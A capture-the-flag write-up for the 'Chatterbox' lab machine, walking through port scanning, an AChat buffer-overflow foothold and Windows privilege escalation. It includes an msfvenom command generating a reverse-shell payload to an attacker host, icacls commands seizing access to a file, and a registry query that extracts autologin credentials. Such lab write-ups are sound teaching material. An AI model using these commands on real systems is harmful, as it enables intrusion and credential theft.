# Chatterbox

In this room we are going to attempt to get root in the **Chatterbox** machine which its theme is Windows Privilege Escalation!

Let's begin.

### Port Enumeration

Let's first start with a simple port enumeration command:

```
nmap <ip> -A -T4 -p-
```

> PORT      STATE SERVICE
> 135/tcp   open  msrpc
> 139/tcp   open  netbios-ssn
> 445/tcp   open  microsoft-ds
> 9255/tcp  open  mon
> 9256/tcp  open  unknown
> 49152/tcp open  unknown
> 49153/tcp open  unknown
> 49154/tcp open  unknown
> 49155/tcp open  unknown
> 49156/tcp open  unknown
> 49157/tcp open  unknown

### Foothold: AChat Buffer Overflow

https://www.exploit-db.com/exploits/36025

We can use the exploit above to get a shell from performing a Buffer Overflow on the target.

We should generate our payload using the command:

```
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=<> LPORT=<> -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

Paste it into the buf variable and run the exploit opening a /multi/handler using Metasploit.

### Privilege Escalation

#### Method 1

We can see with the dir command that the owner of the root.txt file is Alfred. Hence, we can give full access to the Alfred user in order to read the file.

```
icacls root.txt
dir /q root.txt
icacls root.txt /grant Alfred:(f)
type root.txt
```

#### Method 2

Alternatively we can extract credentials of the Alfred user using the following query of registry keys:

```
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

 With this set of credentials we can try to login to the Administrator account by checking for password reuse.

We can login as this user using SMB but since it can be only accessed from the target machine we need to erform Remote Port Forwarding with Meterpreter or with a tool such as Plink.exe.

In order to do this we are going to need to use plink.exe to perform Remote Port Forwarding in order to access the SMB port which is only accessible internally from the machine.

After doing this we are going to use winexe to login as the Administrator user.
